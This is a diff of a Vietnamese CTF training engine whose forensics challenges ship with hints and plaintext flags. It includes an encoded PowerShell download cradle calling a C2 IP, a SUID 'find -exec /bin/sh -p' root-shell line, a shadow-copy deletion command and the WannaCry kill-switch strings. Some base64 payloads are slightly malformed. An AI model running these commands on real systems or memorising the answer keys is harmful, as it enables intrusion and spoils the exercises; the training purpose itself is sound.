@@ -18,38 +18,41 @@ class CTFEngine {
                 difficulty: "Dễ",
                 points: 100,
                 description: "Một email khẩn cấp gửi tới Trưởng phòng Tài chính giả mạo CEO yêu cầu duyệt chi tiền gấp vào tài khoản lạ. Đội ngũ SOC đã trích xuất toàn bộ tiêu đề thư RFC 5322 (Email Header). Hãy phân tích các trường Authentication-Results, Received, và liên kết độc hại để xác định kết quả kiểm tra SPF, địa chỉ IP máy chủ gửi và tên miền C2!",
-                codeSnippet: `Delivered-To: cfo@finance-corp.vn
-Received: by 2002:a05:6512:444:: with SMTP id t4csp12456;
+                codeSnippet: `Delivered-To: victim_cfo@corp-finance.com
+Received: by 2002:a17:906:85c1:: with SMTP id ab12;
         Mon, 17 Nov 2026 09:14:22 -0800 (PST)
-Received: from mail.evil-c2-phish.xyz (mail.evil-c2-phish.xyz. [185.220.101.45])
-        by mx.google.com with ESMTP id w12si89012qkj.45
-        for <cfo@finance-corp.vn>;
-Received-SPF: fail (google.com: domain of attacker@evil-c2-phish.xyz does not designate 185.220.101.45 as permitted sender) client-ip=185.220.101.45;
+Received: from mail.secure-invoicing-gateway.org (mail.secure-invoicing-gateway.org [194.26.29.112])
+        by mx.google.com with ESMTP id q12si89012qkj.45
+        for <victim_cfo@corp-finance.com>;
+Received-SPF: softfail (google.com: domain of transitioning billing@secure-invoicing-gateway.org does not designate 194.26.29.112 as permitted sender) client-ip=194.26.29.112;
 Authentication-Results: mx.google.com;
-       dkim=fail header.i=@finance-corp.vn;
-       spf=fail (google.com: domain of attacker@evil-c2-phish.xyz does not designate 185.220.101.45 as permitted sender) smtp.mailfrom=attacker@evil-c2-phish.xyz;
-       dmarc=fail (p=REJECT sp=REJECT dis=NONE) header.from=finance-corp.vn
-From: "CEO Nguyen Van An" <ceo@finance-corp.vn>
-Reply-To: "Executive Desk" <exec-approval@evil-c2-phish.xyz>
-To: cfo@finance-corp.vn
-Subject: [KHẨN CẤP] Ủy nhiệm chi thanh toán hợp đồng bảo mật Q4-2026
-Date: Mon, 17 Nov 2026 17:14:15 +0700
-Message-ID: <20261117171415.8921.qmail@evil-c2-phish.xyz>
+       dkim=neutral (bad sig) header.i=@corp-finance.com;
+       spf=softfail (google.com: domain of billing@secure-invoicing-gateway.org) smtp.mailfrom=billing@secure-invoicing-gateway.org;
+       dmarc=fail (p=NONE) header.from=corp-finance.com
+From: "CEO Michael" <ceo@corp-finance.com>
+Reply-To: "Finance Verification" <verify@cloud-invoice-pay.xyz>
+To: victim_cfo@corp-finance.com
+Subject: [URGENT] Thanh toán hóa đơn nhà cung cấp hạ tầng
 Content-Type: text/html; charset="UTF-8"
 
-<p>Chào anh, vui lòng duyệt thanh toán gấp theo chứng từ đính kèm tại liên kết bảo mật:</p>
-<a href="https://evil-c2-phish.xyz/invoice/view?token=8f9a2b">Xem UNC & Duyệt Thanh Toán Ngay</a>
+<p>Vui lòng đối soát và chuyển khoản ngay trước 17h hôm nay tại cổng:</p>
+<a href="https://auth.cloud-invoice-pay.xyz/portal/verify?id=99281">Xác nhận chuyển khoản</a>
 
-Nhiệm vụ: Tìm kết quả SPF (spf_fail), IP relay của kẻ tấn công và tên miền C2 lừa đảo.
-Định dạng nộp cờ: FLAG{spf_fail_<IP_Attacker>_<C2_Domain>}`,
+---
+YÊU CẦU:
+1. Xác định kết quả kiểm tra SPF ghi nhận trong Authentication-Results (ví dụ: pass, fail, softfail, none).
+2. Xác định địa chỉ IPv4 của máy chủ gửi thư thực tế (client-ip).
+3. Xác định tên miền C2 lừa đảo trong liên kết xác nhận (Domain trong URL liên kết thẻ <a>).
+Cú pháp cờ: FLAG{<kết_quả_SPF>_<client_ip>_<tên_miền_c2>}
+(Ví dụ mẫu cú pháp: FLAG{fail_1.2.3.4_example.com})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
             🛠️ Công cụ gợi ý (Recommended Tools):
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
-            • <b>MXToolbox Email Header Analyzer</b> / <b>Google Admin Toolbox (Messageheader)</b>: Phân tích trực quan từng chặng chuyển tiếp thư.<br>
-            • <b>CyberChef</b> / <b>VS Code</b> / Lệnh Linux <code>grep -i -E "spf|received|reply-to"</code>: Trích xuất nhanh các trường dữ liệu quan trọng.
+            • <b>MXToolbox Email Header Analyzer</b> / <b>Google Admin Toolbox (Messageheader)</b>: Phân tích trực quan các chặng email.<br>
+            • <b>CyberChef</b> / <b>Text Editor</b>: Tìm kiếm các trường RFC 5322.
         </div>
     </div>
     <div>
@@ -57,14 +60,14 @@ Nhiệm vụ: Tìm kết quả SPF (spf_fail), IP relay của kẻ tấn công v
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Xem dòng <code>Authentication-Results</code>: SPF trả về kết quả <b>spf=fail</b> do IP gửi không nằm trong bản ghi SPF TXT của domain finance-corp.vn.<br>
-            2. Chặng mạng <code>Received: from mail.evil-c2-phish.xyz</code> xác định IP máy chủ relay của kẻ tấn công là <b>185.220.101.45</b>.<br>
-            3. Trường <code>Reply-To</code> và thẻ <code>&lt;a href="..."&gt;</code> trỏ trực tiếp về tên miền C2 độc hại: <b>evil-c2-phish.xyz</b>.<br>
-            4. Ghép lại theo định dạng cờ: <code>FLAG{spf_fail_185.220.101.45_evil-c2-phish.xyz}</code>.
+            1. Xem dòng <code>Authentication-Results</code> hoặc <code>Received-SPF</code>: Đọc kết quả SPF của máy chủ gửi thư.<br>
+            2. Chặng mạng <code>Received: from ...</code> chứa tham số <code>client-ip</code> chỉ ra địa chỉ IP của máy chủ relay thực tế.<br>
+            3. Xem thẻ liên kết <code>&lt;a href="..."&gt;</code> ở phần nội dung thư: Trích xuất hostname/domain chính của trang web phishing.<br>
+            4. Ghép 3 thành phần trên lại thành cờ theo đúng mẫu cú pháp.
         </div>
     </div>
 </div>`,
-                flag: "FLAG{spf_fail_185.220.101.45_evil-c2-phish.xyz}"
+                flag: "FLAG{softfail_194.26.29.112_cloud-invoice-pay.xyz}"
             },
             {
                 id: 2,
@@ -76,19 +79,25 @@ Nhiệm vụ: Tìm kết quả SPF (spf_fail), IP relay của kẻ tấn công v
                 points: 150,
                 description: "Nhân viên nhặt được chiếc USB có dán nhãn 'Danh_Sach_Thuong_Tet_2026.pdf.lnk' tại sảnh công ty và cắm vào máy tính. File shortcut kích hoạt tiến trình ngầm powershell.exe với tham số -Enc (EncodedCommand) để tải mã độc vào bộ nhớ. Hãy giải mã payload Base64 UTF-16LE để bóc trần hàm tải file, địa chỉ IP C2 và cổng lắng nghe!",
                 codeSnippet: `# Trích xuất đối số dòng lệnh từ Shortcut LNK qua sự kiện Sysmon Event ID 1:
-C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMgAwAC4AMQA1ADUAOgA4ADQANAAzAC8AcABheWxvYWQucHMxACcAKQA=
+powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADAALgA2ADYAOgA5ADAAMAAxAC8AYwAyAC4AZQB4AGUAJwAsACAAJwBjADoAXAB0AG1wAFwAdgBpAHIAdQBzAC4AZQB4AGUAJwApAA==
 
-# Nhiệm vụ: Giải mã tham số Base64 UTF-16LE sang chuỗi lệnh PowerShell nguyên gốc.
-# Định dạng nộp cờ: FLAG{powershell_<hàm_tải_file>_<IP_C2>_<Port>}`,
+---
+YÊU CẦU:
+Giải mã chuỗi Base64 UTF-16LE trên để tìm:
+1. Tên phương thức được gọi từ đối tượng Net.WebClient (ví dụ: DownloadString, DownloadFile, OpenRead...)
+2. Địa chỉ IP của máy chủ C2
+3. Cổng (Port) kết nối
+Cú pháp cờ: FLAG{<tên_phương_thức>_<IP_C2>_<Port>}
+(Ví dụ mẫu cú pháp: FLAG{DownloadData_10.0.0.1_8080})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
             🛠️ Công cụ gợi ý (Recommended Tools):
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
-            • <b>CyberChef</b>: Thêm Recipe <code>From Base64</code> -> <code>Decode text (UTF-16LE (1200))</code>.<br>
-            • <b>Terminal Linux/macOS</b>: <code>echo "SQBF..." | base64 -d | iconv -f UTF-16LE -t UTF-8</code>.<br>
-            • <b>NETLAB CLI</b>: Bạn có thể gõ ngay <code>b64 decode &lt;chuỗi&gt;</code> trong Terminal bên dưới!
+            • <b>NETLAB Virtual Terminal</b>: Bạn có thể gõ ngay lệnh <code>b64 decode &lt;chuỗi&gt;</code> ở console bên dưới!<br>
+            • <b>CyberChef</b>: Recipe <code>From Base64</code> -> <code>Decode text UTF-16LE</code>.<br>
+            • <b>Python CLI</b>: <code>base64.b64decode("...").decode("utf-16le")</code>.
         </div>
     </div>
     <div>
@@ -96,14 +105,13 @@ C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hid
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. PowerShell trên Windows luôn lưu trữ chuỗi mã hóa sau <code>-Enc</code> dưới định dạng 2-byte Unicode UTF-16 Little Endian.<br>
-            2. Kết quả sau khi giải mã: <code>IEX (New-Object Net.WebClient).DownloadString('http://10.10.20.155:8443/payload.ps1')</code>.<br>
-            3. Hàm thực thi tải tệp trực tiếp vào RAM là <b>DownloadString</b>, địa chỉ IP C2 là <b>10.10.20.155</b> và cổng là <b>8443</b>.<br>
-            4. Cờ hoàn chỉnh: <code>FLAG{powershell_DownloadString_10.10.20.155_8443}</code>.
+            1. PowerShell trên Windows mã hóa tham số <code>-enc</code> dưới dạng UTF-16LE (Unicode 16-bit Little Endian).<br>
+            2. Sau khi giải mã, bạn sẽ thấy câu lệnh gọi một phương thức của lớp <code>Net.WebClient</code> để tải mã độc từ một địa chỉ IP và Port cụ thể.<br>
+            3. Trích xuất đúng tên hàm, IP và Port để hoàn thành cờ.
         </div>
     </div>
 </div>`,
-                flag: "FLAG{powershell_DownloadString_10.10.20.155_8443}"
+                flag: "FLAG{DownloadFile_192.168.100.66_9001}"
             },
 
             // =========================================================================
@@ -118,27 +126,33 @@ C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hid
                 difficulty: "Trung bình",
                 points: 150,
                 description: "Trạm làm việc của kế toán viên bị tấn công bởi mã độc tống tiền họ WannaCry từ tiến trình tasksche.exe, toàn bộ dữ liệu bị đổi đuôi sang .wncry. Trước khi mã hóa ổ cứng, mã độc luôn gửi request HTTP GET tới một domain sinkhole (Kill-Switch). Phân tích chuỗi nhị phân (strings dump) của tiến trình để tìm domain giải cứu này!",
-                codeSnippet: `$ strings -a -t x tasksche_memory_dump.dmp | grep -i "http://"
-  40e010  http://www.w3.org/1999/xhtml
-  40e080  http://schemas.microsoft.com/expression/2006
-  40f1a0  http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
-  40f230  InternetOpenA; wininet.dll
-  40f260  InternetOpenUrlA: GET http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
-  40f2d0  CryptGenRandom; CryptEncrypt; CryptExportKey; advapi32.dll
-  40f340  cmd.exe /c vssadmin.exe Delete Shadows /All /Quiet
+                codeSnippet: `$ strings -a -t x tasksche_dump.dmp | grep -E "http://|reg|crypt"
+  10a020  http://schemas.microsoft.com/expression/2006
+  10a180  CryptAcquireContextA
+  10a240  RegOpenKeyExA (HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)
+  10a3b0  http://www.w3.org/1999/xhtml
+  10b050  CryptGenRandom
+  10b120  InternetOpenA (User-Agent: Mozilla/4.0)
+  10b190  http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
+  10b250  CryptEncrypt
+  10b310  InternetOpenUrlA
+  10b420  http://ocsp.digicert.com
+  10b550  RegSetValueExA
+  10b680  cmd.exe /c vssadmin.exe Delete Shadows /All /Quiet
 
-[THÔNG TIN ĐIỀU TRA]:
-Nếu truy vấn HTTP tới domain sinkhole trả về Status 200 OK, mã độc sẽ kích hoạt Kill-Switch và thoát tiến trình lập tức!
-Định dạng nộp cờ: FLAG{killswitch_<tên_miền_hoàn_chỉnh>}`,
+---
+YÊU CẦU:
+Tìm tên miền sinkhole (Kill-Switch) bất thường mà mã độc kết nối tới để kiểm tra trước khi gọi hàm mã hóa CryptEncrypt.
+Cú pháp cờ: FLAG{<tên_miền_killswitch>}
+(Ví dụ: FLAG{www.example-domain.com})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
             🛠️ Công cụ gợi ý (Recommended Tools):
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
-            • <b>Volatility Framework</b>: <code>vol.py -f memory.raw windows.strings / windows.netscan</code>.<br>
-            • <b>Sysinternals Strings / Linux CLI</b>: <code>strings tasksche.exe | grep -i "http"</code>.<br>
-            • <b>Ghidra / IDA Pro</b>: Decompile hàm WinMain và kiểm tra hàm <code>InternetOpenUrlA</code>.
+            • <b>Volatility Framework</b>: <code>vol.py -f mem.dmp windows.strings</code>.<br>
+            • <b>Sysinternals Strings / Linux CLI</b>: Tìm kiếm chuỗi URL trong bộ nhớ.
         </div>
     </div>
     <div>
@@ -146,13 +160,12 @@ Nếu truy vấn HTTP tới domain sinkhole trả về Status 200 OK, mã độc
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Mã độc WannaCry kiểm tra xem domain sinkhole có phản hồi không trước khi mã hóa; nếu domain phản hồi thành công, mã độc tự thoát nhằm tránh bị phân tích trong môi trường Sandbox ảo hóa.<br>
-            2. Tên miền Kill-Switch nằm tại offset <code>40f1a0</code>: <b>www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com</b>.<br>
-            3. Cờ hợp lệ: <code>FLAG{killswitch_www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com}</code>.
+            1. Các URL như <code>w3.org</code>, <code>microsoft.com</code>, <code>digicert.com</code> là các domain hợp lệ của hệ điều hành Windows.<br>
+            2. Hãy tìm tên miền dài bất thường được mã độc truy vấn thông qua hàm <code>InternetOpenUrlA</code> ngay trước khi kích hoạt hàm mã hóa <code>CryptEncrypt</code>.
         </div>
     </div>
 </div>`,
-                flag: "FLAG{killswitch_www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com}"
+                flag: "FLAG{www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com}"
             },
             {
                 id: 4,
@@ -163,31 +176,35 @@ Nếu truy vấn HTTP tới domain sinkhole trả về Status 200 OK, mã độc
                 difficulty: "Nâng cao",
                 points: 200,
                 description: "Kẻ tấn công chiếm được tài khoản thường devops (uid=1001) trên máy trạm lập trình viên. Rà quét phân quyền phát hiện một binary hệ thống được bật cờ SUID (-rwsr-xr-x) thuộc quyền root. Hãy xác định cú pháp GTFOBins chuẩn với binary /usr/bin/find để spawn một root shell và chiếm quyền quản trị cao nhất!",
-                codeSnippet: `devops@workstation-ubuntu:~$ id
-uid=1001(devops) gid=1001(devops) groups=1001(devops),4(adm)
+                codeSnippet: `devops@workstation:~$ id
+uid=1001(devops) gid=1001(devops) groups=1001(devops)
 
-devops@workstation-ubuntu:~$ find / -perm -u=s -type f 2>/dev/null
+devops@workstation:~$ find / -perm -u=s -type f 2>/dev/null
 /usr/bin/passwd
-/usr/bin/sudo
-/usr/bin/chsh
 /usr/bin/newgrp
-/usr/bin/find   <--- [CẢNH BÁO: SUID BIT SET BỞI QUẢN TRỊ VIÊN CẨU THẢ]
-/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/find
+/usr/bin/mount
+/usr/bin/pkexec
 
-devops@workstation-ubuntu:~$ ls -la /usr/bin/find
+devops@workstation:~$ ls -l /usr/bin/find
 -rwsr-xr-x 1 root root 198944 Jan 15 2026 /usr/bin/find
 
-Nhiệm vụ: Tìm tham số của lệnh /usr/bin/find để thực thi shell /bin/sh giữ nguyên quyền root (-p).
-Định dạng nộp cờ: FLAG{find_-exec_/bin/sh_-p_\\;_-quit}`,
+---
+YÊU CẦU:
+Tra cứu kho lưu trữ GTFOBins cho binary có cờ SUID trên. Xác định cú pháp khai thác với binary 'find':
+Thực thi lệnh shell 'sh' với tham số bảo toàn quyền root ('-p').
+Cú pháp cờ: FLAG{find_exec_<tên_shell>_<cờ_bảo_toàn_quyền>}
+(Ví dụ: nếu thực thi bash với cờ -p thì cú pháp là: FLAG{find_exec_bash_p})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
             🛠️ Công cụ gợi ý (Recommended Tools):
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
-            • <b>LinPEAS</b>: Script tự động dò lỗ hổng leo thang đặc quyền Linux.<br>
-            • <b>GTFOBins</b>: Tra cứu kỹ thuật bypass shell tại <code>gtfobins.github.io/gtfobins/find</code>.<br>
-            • Lệnh tìm SUID: <code>find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null</code>.
+            • <b>GTFOBins</b>: Trang tra cứu leo thang đặc quyền kinh điển tại <code>gtfobins.github.io/gtfobins/find</code>.<br>
+            • <b>LinPEAS</b>: Script tự động dò lỗ hổng SUID trên Linux.
         </div>
     </div>
     <div>
@@ -195,14 +212,13 @@ Nhiệm vụ: Tìm tham số của lệnh /usr/bin/find để thực thi shell /
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Khi binary có quyền SUID (Set User ID), bất kỳ ai chạy nó đều sở hữu quyền của file owner (ở đây là root).<br>
-            2. Tiện ích <code>find</code> hỗ trợ cờ <code>-exec</code> để chạy lệnh ngoại trú.<br>
-            3. Trên Linux hiện đại, <code>/bin/sh</code> sẽ tự động hạ EUID về UID thực tế nếu không có tham số <code>-p</code> (preserve privileges). Cú pháp chuẩn: <code>find . -exec /bin/sh -p \\; -quit</code>.<br>
-            4. Cờ nộp: <code>FLAG{find_-exec_/bin/sh_-p_\\;_-quit}</code>.
+            1. Binary <code>find</code> hỗ trợ tham số <code>-exec</code> để chạy một shell bên ngoài.<br>
+            2. Khi binary có SUID của root, shell <code>sh</code> cần cờ gì để không bị hạ quyền (preserve privileges)?<br>
+            3. Ghép nối tên shell và cờ đó theo định dạng cờ yêu cầu.
         </div>
     </div>
 </div>`,
-                flag: "FLAG{find_-exec_/bin/sh_-p_\\;_-quit}"
+                flag: "FLAG{find_exec_sh_p}"
             },
 
             // =========================================================================
@@ -217,26 +233,31 @@ Nhiệm vụ: Tìm tham số của lệnh /usr/bin/find để thực thi shell /
                 difficulty: "Trung bình",
                 points: 150,
                 description: "Kẻ tấn công cắm laptop vào ổ cắm mạng LAN phòng họp và gửi các gói tin Gratuitous ARP giả mạo để chiếm vị trí trung gian giữa máy kế toán 192.168.1.50 và Gateway 192.168.1.1. Phân tích file pcap để xác định địa chỉ MAC của kẻ tấn công và giá trị Username bị nghe lén trong phiên xác thực SMB/NTLMSSP!",
-                codeSnippet: `=== Wireshark Packet Dissection (lan_mitm.pcap) ===
-Frame 102: 42 bytes on wire (ARP Announcement)
-    Address Resolution Protocol (reply)
-        Sender MAC address: 00:0c:29:ab:cd:ef  <-- [!] Gratuitous ARP
-        Sender IP address:  192.168.1.1 (Gateway IP)
-        Target MAC address: 00:1a:2b:3c:4d:5e (Victim PC)
-        Target IP address:  192.168.1.50
-    [Expert Info: Duplicate IP address detected for 192.168.1.1 (real gateway is 00:50:56:c0:00:01)]
+                codeSnippet: `=== WIRESHARK PACKET SNIPPET (lan_sniff.pcap) ===
 
-Frame 128: 198 bytes on wire (SMB2 / NTLMSSP Negotiate & Auth)
-    Transmission Control Protocol, Src Port: 51234, Dst Port: 445 (SMB)
-    SMB2 (Server Message Block Protocol Version 2)
-    SMB2 Header: Command: Session Setup (0x0001)
-    Security Blob: GSS-API / NTLMSSP
-        NTLMSSP: NTLMSSP_AUTH
-        Calling workstation domain: CORP-VN
-        User name: finance_lead
-        NTLM Response: d8a94b210f... (NetNTLMv2 Captured by Responder)
+[Frame 41] 09:30:01.102 ARP Reply
+    Sender MAC: 00:0c:29:ab:cd:ef
+    Sender IP:  192.168.1.1 (Gateway IP)
+    Target MAC: 00:1a:2b:3c:4d:5e (Victim IP: 192.168.1.50)
+    [Expert Info (Warning/Sequence): Duplicate IP address detected for 192.168.1.1!
+     Real Gateway MAC previously recorded: 00:50:56:c0:00:01]
 
-Định dạng cờ: FLAG{arp_spoof_mac_<MAC_Attacker>_user_<Username>}`,
+[Frame 89] 09:30:05.420 SMB2 Protocol
+    Source: 192.168.1.50:52410 -> Dest: 192.168.1.200:445
+    Command: Session Setup Request (0x0001)
+    Security Blob (NTLMSSP):
+        NTLMSSP_AUTH
+        Domain: CORP-NET
+        User: hr_director
+        Workstation: PC-HR-04
+        NTLMv2 Response: 8a4b2c1d0e...
+
+---
+YÊU CẦU:
+1. Xác định địa chỉ MAC của kẻ tấn công đang gửi gói ARP đầu độc mạng (Sender MAC trong Frame 41).
+2. Xác định Username của nạn nhân bị đánh chặn xác thực SMB2 (User trong Frame 89).
+Cú pháp cờ: FLAG{<MAC_Attacker>_<Username>}
+(Ví dụ mẫu cú pháp: FLAG{11:22:33:44:55:66_admin})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
@@ -244,8 +265,7 @@ Frame 128: 198 bytes on wire (SMB2 / NTLMSSP Negotiate & Auth)
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
             • <b>Wireshark Filter</b>: <code>arp.duplicate-address-detected || ntlmssp.auth.username</code>.<br>
-            • <b>Responder / Ettercap / Bettercap</b>: Công cụ thực hiện MITM và bẫy NTLM hash trong LAN.<br>
-            • <b>Tshark CLI</b>: <code>tshark -r lan_mitm.pcap -Y "smb2" -T fields -e ntlmssp.auth.username</code>.
+            • <b>Responder / Ettercap</b>: Công cụ MITM đánh chặn NTLM hash trong mạng nội bộ.
         </div>
     </div>
     <div>
@@ -253,13 +273,13 @@ Frame 128: 198 bytes on wire (SMB2 / NTLMSSP Negotiate & Auth)
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Trong Frame 102, địa chỉ IP Gateway <code>192.168.1.1</code> bị gán cho MAC giả mạo <b>00:0c:29:ab:cd:ef</b> thay vì MAC thật của Router <code>00:50:56:c0:00:01</code>.<br>
-            2. Trong Frame 128 (phiên SMB2 port 445), trường NTLMSSP_AUTH chỉ rõ tên người dùng bị đánh cắp NetNTLMv2 hash là <b>finance_lead</b>.<br>
-            3. Ghép nối thành cờ: <code>FLAG{arp_spoof_mac_00:0c:29:ab:cd:ef_user_finance_lead}</code>.
+            1. Trong Frame 41, so sánh địa chỉ MAC thật của Gateway (ghi trong phần Expert Info) và Sender MAC của kẻ mạo danh.<br>
+            2. Trong Frame 89, xem trường Security Blob -> NTLMSSP -> NTLMSSP_AUTH để trích xuất tên người dùng <code>User</code>.<br>
+            3. Ghép nối 2 giá trị này lại theo đúng cú pháp cờ.
         </div>
     </div>
 </div>`,
-                flag: "FLAG{arp_spoof_mac_00:0c:29:ab:cd:ef_user_finance_lead}"
+                flag: "FLAG{00:0c:29:ab:cd:ef_hr_director}"
             },
             {
                 id: 6,
@@ -269,27 +289,31 @@ Frame 128: 198 bytes on wire (SMB2 / NTLMSSP Negotiate & Auth)
                 category: "Tấn Công WLAN (Evil Twin / Rogue AP)",
                 difficulty: "Trung bình",
                 points: 150,
-                description: "Kẻ tấn công dựng trạm phát sóng Wi-Fi giả mạo (Evil Twin) phát cùng SSID 'CORPORATE_SECURE_WLAN' với công suất phát rất cao nhằm dụ các máy laptop công ty tự động nhảy kết nối (roaming) để bắt trọn lưu lượng web. Hãy phân tích bảng quét tần số từ airodump-ng để tìm ra BSSID của Rogue AP và kênh (Channel) hoạt động!",
-                codeSnippet: `$ airodump-ng wlan0mon --essid CORPORATE_SECURE_WLAN
+                description: "Kẻ tấn công dựng trạm phát sóng Wi-Fi giả mạo (Evil Twin) phát cùng SSID 'CAMPUS_STUDENT_WIFI' với công suất phát rất cao nhằm dụ các máy laptop tự động nhảy kết nối để bắt trọn lưu lượng web. Hãy phân tích bảng quét tần số từ airodump-ng để tìm ra BSSID của Rogue AP và kênh (Channel) hoạt động!",
+                codeSnippet: `$ airodump-ng wlan0mon --essid "CAMPUS_STUDENT_WIFI"
 
 BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER  AUTH  ESSID
------------------  ---  -------  -----  --  ---  ---  ------  ----  ---------------------
-24:A4:3C:88:12:00  -68      420    950   1  54e  WPA2 CCMP    8021X CORPORATE_SECURE_WLAN [Official AP-Cisco]
-F8:E9:03:DD:AA:99  -21     1580   4100   6  54e  OPEN         NONE  CORPORATE_SECURE_WLAN [Rogue Evil Twin AP]
-24:A4:3C:88:12:01  -72      390    610  11  54e  WPA2 CCMP    8021X CORPORATE_SECURE_WLAN [Official AP-Cisco]
+-----------------  ---  -------  -----  --  ---  ---  ------  ----  --------------------
+00:14:D1:E2:40:10  -78      210    150   1  54e  WPA2 CCMP    MGT   CAMPUS_STUDENT_WIFI
+00:14:D1:E2:40:20  -75      190    180   6  54e  WPA2 CCMP    MGT   CAMPUS_STUDENT_WIFI
+B4:82:C5:99:11:AA  -19     1240   3820   9  54e  OPN          NONE  CAMPUS_STUDENT_WIFI
+00:14:D1:E2:40:30  -80      205    120  11  54e  WPA2 CCMP    MGT   CAMPUS_STUDENT_WIFI
 
-[CẢNH BÁO AN NINH]:
-Rogue AP phát sóng với công suất cực mạnh (PWR -21 dBm) lấn át AP chính quy, nhưng hạ cấp mã hóa xuống OPEN (Không mật khẩu).
-Định dạng nộp cờ: FLAG{evil_twin_bssid_<BSSID>_ch<Channel>} (BSSID viết hoa đầy đủ)`,
+---
+YÊU CẦU:
+Phân tích bảng quét để tìm trạm phát sóng Wi-Fi giả mạo (Evil Twin / Rogue AP):
+1. BSSID của Rogue AP (viết hoa các ký tự chữ)
+2. Số kênh (Channel - cột CH) mà Rogue AP đang phát sóng
+Cú pháp cờ: FLAG{<BSSID>_ch<Channel>}
+(Ví dụ mẫu cú pháp: FLAG{AA:BB:CC:DD:EE:FF_ch3})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
             🛠️ Công cụ gợi ý (Recommended Tools):
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
-            • <b>Aircrack-ng suite</b>: <code>airodump-ng</code>, <code>airmon-ng</code>, <code>aireplay-ng</code>.<br>
-            • <b>Kismet / Wireshark 802.11</b>: Phân tích khung truyền Beacon và Probe Response.<br>
-            • <b>Wi-Fi Analyzer / inSSIDer</b>: Giám sát cường độ tín hiệu RSSI và phát hiện AP lậu.
+            • <b>Aircrack-ng suite</b>: <code>airodump-ng</code>, <code>airmon-ng</code>.<br>
+            • <b>Kismet / Wi-Fi Analyzer</b>: Giám sát tần số không dây 2.4GHz / 5GHz.
         </div>
     </div>
     <div>
@@ -297,14 +321,13 @@ Rogue AP phát sóng với công suất cực mạnh (PWR -21 dBm) lấn át AP 
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Evil Twin AP thường được đặt gần khu vực người dùng nên có mức thu tín hiệu PWR rất mạnh: <b>-21 dBm</b> (chỉ số âm càng nhỏ thì tín hiệu càng mạnh).<br>
-            2. AP chính quy sử dụng WPA2-Enterprise (802.1X), trong khi AP giả mạo mở <b>OPEN / NONE</b> để bẫy Captive Portal lừa mật khẩu.<br>
-            3. BSSID của Rogue AP là <b>F8:E9:03:DD:AA:99</b> và hoạt động trên kênh <b>6</b>.<br>
-            4. Cờ: <code>FLAG{evil_twin_bssid_F8:E9:03:DD:AA:99_ch6}</code>.
+            1. Evil Twin AP thường có mức tín hiệu nhận (PWR) rất cao (số âm càng nhỏ càng mạnh, ví dụ -19 dBm so với -78 dBm) vì đặt gần nạn nhân.<br>
+            2. Rogue AP thường hạ cấp mã hóa xuống <code>OPN</code> (Open - không mật khẩu) để dụ người dùng kết nối.<br>
